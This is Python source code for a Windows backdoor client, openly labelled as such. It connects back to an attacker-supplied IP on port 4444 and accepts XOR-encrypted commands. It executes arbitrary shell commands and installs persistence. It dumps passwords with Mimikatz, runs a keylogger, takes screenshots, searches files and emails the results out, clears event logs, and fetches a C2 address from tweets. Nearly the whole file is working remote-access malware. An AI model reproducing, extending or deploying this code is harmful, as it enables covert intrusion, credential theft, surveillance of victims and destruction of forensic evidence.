import socket
import json
from XOR_Encryption import *
from FileAction import *
from Mimikatz import *
from PortScanner import *
from KeyLogger import *
from Screenshot import *
from DumpPassword import *
from SearchFile import *
from ClearTracking import *
from TweetGrabber import *
from Persistence import *

# IP_ADDR = '192.168.254.129'
PORT = 4444
CMD = r"C:\Windows\System32\cmd.exe"
# EVENTVWR_PATH = r'C:\Windows\System32\eventvwr.exe'
# PYTHON_CMD = "python"
key = "WHAkyI=g0>%Z!\uS}Thk%^]T#xMeoCMU81ktDZ1{tB4y{V]s;\,/!u&-XjX+|bHh{2:8)>Y5S6?y~C2,Cpc|lQ\|s;xLZ%H/f^+9ceNKA+hi:T]aADk9o&07SdIP3?yC,WR3^\knOZ[5Zket9!&<^AhHR?_7)z,dRA\jd^!#\[H~_&8C/U?Iy1]{J8-hq(aPI-v<Pdq)_\<]n8].<7cd2-=k/P^CRz30FIvUVW8o~uloem,h+,:mn(gLK~\{uupLF|O|;0La$dWh;ES4Ob]jQgw6&+l%t\3kgwbZg7$iY|%M0$26m};#^tdg\\!^SMUZ<U&5pyv:Q2}WgIueC?:&t#~C>y;8n^hE$\wm>YElKiP/QkH\y4+?yI_RFy=OkNs!BUF4d4CrUFg!%nfjt{1:f7_!zNJ!U-_Qn\/s<^2BZ^w%(:BbW#~&%_a$In(/BGe_ws)HZ%km9w_b}MY54to4X8s5IF(aO=P}>eguE$pxu_{c6aE3EIDu9QyT[.5|viHDflds!)USPIEpf.V:dJrD^.i0\,s\gR?rI1W>Q-Bd5)=Mp0/^_rg.(D}HOPVxR2Yx~m{e%dBL%6KGBn4c&]N6h$>CP;u&(+{X1v{3W&YJRN)Z6$.~a#mo[Bf\8$!OMbqVG_[9L>(U?R/ZD{/>9YYdK,i(Tw{CV{JMBVyf4vVu&[cE6/{yN:,og2>o#p,[k65SZ$9>X=9Yq-W}A\C$!C4p.g0<Mx>0E1^Qzm\E=Ncd:Zw.I5ZN5H\S#$I$Dsoq0d_BW7QN0f3CNw:%|51%9_.n5v0Lf],5&!l~#(]VlO<j?rA4]?Y{MiHXcY&4tgIoxTNv}CnKM&H2~(.hmTqn.YAo,dzwQKCBN-;/8=:u6jby[a?,omVr7u:4HTg46cl)jT/&q+hSV8hGQBh^;O7f\B&n=OXLYh<%zyP2gs0zI/z!;NPoQ3QdPp,E#~/Qatb8XUsS-RHr|PLX#V\!I,1\+$i#):RRlQhq$:q}u0j\#UqmJP<5Dz0{P4i/xoaC:DGJN[=V"
# MY_EMAIL = "thanhnx.demo@gmail.com"
# MY_PASSWORD = "Thanh@123456"
time_interval = 30


class Backdoor:
    def __init__(self, ip, port):
        self.KEY = key
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # initialize a socket
        self.s.connect((IP_ADDR, PORT))  # connecting to server
        print("[+] Connected to server " + IP_ADDR + ":" + str(PORT))
        self.keylogger = Keylogger(time_interval, MY_EMAIL, MY_PASSWORD)

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Change path to " + path

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.s.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.s.recv(4096)
                return json.loads(json_data)
            except ValueError:
                continue

    def communicate(self, command):
        return subprocess.Popen(command, shell=True,  # using Popen can receive both output and error
                                stdout=subprocess.PIPE,  # subprocess.check_output cannot get error
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)

    # def transfer(self, s, path):
    #     if os.path.exists(path):
    #         f = open(path, 'rb')
    #         packet = f.read()
    #         while packet != '':
    #             encrypt_data = str_xor(packet, self.KEY)
    #             self.reliable_send(encrypt_data)
    #             packet = f.read()
    #         f.close()
    #         return 'DONE'
    #
    #     else:  # the file doesn't exist
    #         return 'Unable to find out the file'

    def send_server(self, command_result):
        encrypt_data = str_xor(command_result, self.KEY)
        self.reliable_send(encrypt_data)

    def main(self):
        # self.hidden_process()

        Persistence()  # persistence - copy file and run when the windows starts
        # self.Execute_bypass_UAC()
        while True:
            decrypt_data = list()
            command = self.reliable_receive()  # receive the buff from server
            for i in command:
                decrypt_data.append(str_xor(i, self.KEY))
            print command
            print decrypt_data
            if decrypt_data[
                0] == "break":  # if we got terminate order from the attacker, close the socket and break the loop
                print "[-] Close Connection!!!"
                self.s.close()
                break
            elif decrypt_data[0] == "cd" and len(decrypt_data) > 1:  # run cd command line
                try:
                    print decrypt_data[0]
                    self.change_directory(decrypt_data[1])
                    print decrypt_data[1]
                    _string_ = "[+] New directory: " + decrypt_data[1]
                    self.send_server(_string_)
                except:
                    temp = "[-] Path is incorrect: " + decrypt_data[1]
                    self.send_server(temp)
            elif decrypt_data[0] == "drop":  # drop  file from server
                command_result = write_file(decrypt_data[1], decrypt_data[2])
                self.send_server(command_result)
            elif decrypt_data[0] == "grab":  # read a file from client
                command_result = read_file(decrypt_data[1])
                self.send_server(command_result)
            elif decrypt_data[0] == "unzip":  # unzip file .zip
                command_result = unzip(decrypt_data[1], decrypt_data[2])
                self.send_server(command_result)
            elif decrypt_data[0] == "download":  # download file with link download and create a file name
                try:
                    download_file(decrypt_data[1], decrypt_data[2])
                    temp = "[+] DOWNLOAD SUCCESS FILE " + decrypt_data[2]
                    self.send_server(temp)
                except:
                    print("ERROR")
                    temp = "[-] DOWNLOAD ERROR: " + decrypt_data[1]
                    self.send_server(temp)
            elif decrypt_data[0] == "scan":  # scan a range network using nmap
                try:
                    command_result = scanner(decrypt_data[1], decrypt_data[2])
                    self.send_server(command_result)
                except:
                    temp = "[-] ERROR! Syntax: scan <range> <port> ! Try again."
                    self.send_server(temp)
            elif decrypt_data[0] == "mimikatz":  # ussing mimikatz to dump password
                try:
                    command_result = mimikatz()
                    write_file("passdump.txt", command_result)
                    send_mail(MY_EMAIL, MY_PASSWORD, command_result)
                    self.send_server(command_result)
                except:
                    encrypt_data = str_xor("[-] ERROR when dump password! Try again.", self.KEY)
                    self.reliable_send(encrypt_data)
            # elif decrypt_data[0] == "take":
            #     try:
            #         command_result = self.transfer(self.s, decrypt_data[1])
            #         self.send_server(command_result)
            #     except:
            #         temp = "[-] Error when take file from client. Try again!"
            #         self.send_server(temp)
            elif decrypt_data[0] == "keylogger":
                try:
                    command_result = self.keylogger.start()
                    self.send_server(command_result)
                except:
                    temp = "[-] Error when running Keylogger..."
                    encrypt_data = str_xor(temp, self.KEY)
                    self.reliable_send(encrypt_data)
            elif decrypt_data[0] == "screenshot":
                command_result = takeSreenshot(MY_EMAIL, MY_PASSWORD)
                self.send_server(command_result)

            elif decrypt_data[0] == 'dumpPass':
                command_result = str(dumpPass())  # dumppass return a list
                self.send_server(command_result)
            elif decrypt_data[0] == 'search':  # search all file with path file and format file
                try:
                    command_result = searchFile(decrypt_data[1])
                    SUBJECT = "SEARCHING FILE"
                    command_result = 'Subject: {}\n\n{}'.format(SUBJECT, command_result)
                    send_mail(MY_EMAIL, MY_PASSWORD, command_result)
                    self.send_server("[+] Searching done! Check your mail....")
                except:
                    command_result = "[-] Error systax: search <path>*<formatfile>"
                    self.send_server(command_result)
            elif decrypt_data[0] == 'cleartracking':
                try:  # clear event log: Application log, System log, Setup log, Security log
                    command_result = clearEventlog()
                    self.send_server(command_result)
                except:
                    command_result = "[-] Error when clear event log!"
                    self.send_server(command_result)
            elif decrypt_data[0] == 'tweetgrabber':
                try:
                    command_result = str(tweet_grab_ipC2(decrypt_data[1]))
                    self.send_server(command_result)
                except:
                    command_result = '[-] Error when crawling IP C&C Address!!'
                    self.send_server(command_result)
            elif decrypt_data[0]=='-help':
                command_result="**********************Create by ThanhNX*******************"
                self.send_server(command_result)
            else:  # otherwise, we pass the received command to a shell process
                result_command = self.communicate(decrypt_data)
                value_output = result_command.stdout.read() + result_command.stderr.read()  # value = out put+ error
                self.send_server(value_output)  # send value_output

        # privilege_escalation.clean_reg()
        self.s.close()


if __name__ == '__main__':
    IP_ADDR = raw_input("Input IP address of attacker>>")
    MY_EMAIL = raw_input("Input mail of attacker>>")
    MY_PASSWORD = raw_input("Input password mail of attacker>>")
    Backdoor(IP_ADDR, PORT).main()
